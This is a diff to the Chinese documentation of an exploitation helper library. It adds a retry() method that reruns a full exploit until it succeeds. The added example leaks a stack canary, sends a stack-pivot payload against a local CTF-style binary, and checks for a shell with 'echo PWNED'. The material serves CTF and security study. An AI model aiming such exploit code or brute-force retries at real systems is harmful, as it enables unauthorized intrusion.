@@ -35,6 +35,7 @@ blind = CHun.blind(lambda: CHun.remote("example.com", 31337).raw)
 - 显式挂出 `sendlineafter()` / `recvline()` / `interactive()` 以及 `sla()` / `rl()` / `ia()` 等高频方法
 - 显式挂出 `recv_leak()`，用于脚本态直接接收并记录 leak
 - 显式挂出 `replay()`，用于脚本态按“当前位置前缀”回放并注入 payload
+- 显式挂出 `retry()`，用于把“整段 Exploit 反复执行直到碰撞成功”收敛为一次调用
 - `session` / `io`：保留为底层出口
 
 显式工厂与 `CHun.script()` 在内部都会先收敛到同一套 `TargetSpec` / `TransportSpec` builder，再交给 `from_specs()` 组装 session。
@@ -165,6 +166,13 @@ t.gdb("b *main\nc")
 - `t.replay(action, *args, action_kwargs=...)` 支持函数模式；无需改外部函数签名，语法糖会在 replay 子会话里临时绑定全局 `s`
 - `t.replay(..., expected=...)` 可做命中判断；`capture_replay_registry=True` 回传 replay 子会话 rec 展示到 `result.metadata["replay_registry_lines"]`
 - `t.replay(..., show_recv=True)` 会输出 `[replay recv]`；内部会临时提升日志级别后再恢复，不受 `replay_silent` 影响
+- `t.retry(attempt, times=..., success=...)` 会把一次完整 Exploit 反复执行，直到命中成功判定或用尽次数；每轮都会创建全新会话（本地即全新进程），而不是 `reconnect()` 旧进程
+- `t.retry(...)` 的 `attempt(s)` 回调里 `s` 就是当轮对应的 `ScriptEntry`，可正常使用 `s.sla` / `s.recv_leak` / `s.elf` 等全部脚本态语法糖
+- `t.retry(...)` 默认把 `EOFError` / `TimeoutError` / `OSError` / `TransportError` / `RetryableAttemptError` 视为“预期利用失败”并继续；其余异常（如 `AttributeError` / `TypeError`）会直接抛出，不会被吞掉
+- `t.retry(..., success=...)` 接收当轮 `RetryResult`（含 `session` 与 `value`），返回真值即判定成功；缺省时以“未抛预期失败异常”为成功
+- `t.retry(...)` 成功后返回 `RetryResult`，其中 `result.session` 就是命中当轮、**未被关闭**的会话，可直接 `result.session.io.interactive()`
+- `t.retry(...)` 达到上限会抛出 `RetryExhaustedError`，不会静默返回已关闭的会话
+- `t.retry(...)` 在 `GDB` 模式下会 warning：每轮都会重新拉起调试器，建议爆破阶段关闭 GDB
 - `t.libc_base` / `t.libc_version` 以及 `t.session.libc_base` / `t.session.libc_version` 提供快捷读取；若尚未确认则抛 `RuntimeError`
 - `t.resolve.symbol("str_bin_sh")` / `t.resolve.symbol("puts@got")` 会自动做后缀剥离和 alias 归一化；已绑定 `t.libc` 时优先走本地 `libc_elf + libc.base`，否则回退到 `libc.version + catalog`
 - 访问 `t.session` / `t.rec` / `t.infer` / `t.resolve` / `t.dbg` / `t.crash` 前必须先 `t.start()`；否则抛 `RuntimeError`
@@ -257,6 +265,31 @@ print(verify.ok, verify.reason)
 # def show(index): menu(3); s.sla(b"Index: ", str(index).encode())
 verify2 = s.replay(show, 7, show_recv=True)
 print(verify2.ok, verify2.reason)
+```
+
+```python
+# 栈迁移 / 地址碰撞：整段 Exploit 自动重试
+def attempt(s):
+    s.gdb("b *0x400894")
+    s.sendline(b"a" * 0x27 + b"b")
+    s.recvuntil(b"aaaab")
+    canary = s.recv_leak("canary", domain="elf", size=8) & ~0xFF
+    s.sa(b"key\n", p32(0x02C3))
+    payload = p64(0x40083F) * 10 + flat([s.elf.sym["treasure"], canary])
+    s.sa(b"to me\n", payload)
+    return s.recv(4096)
+
+def verify(result):
+    result.session.io.sendline(b"echo PWNED")
+    return b"PWNED" in result.session.io.recv(4096)
+
+result = CHun.script("./pwnmove").retry(
+    attempt,
+    times=200,
+    success=verify,
+)
+if result.success:
+    result.session.io.interactive()
 ```
 
 ```python
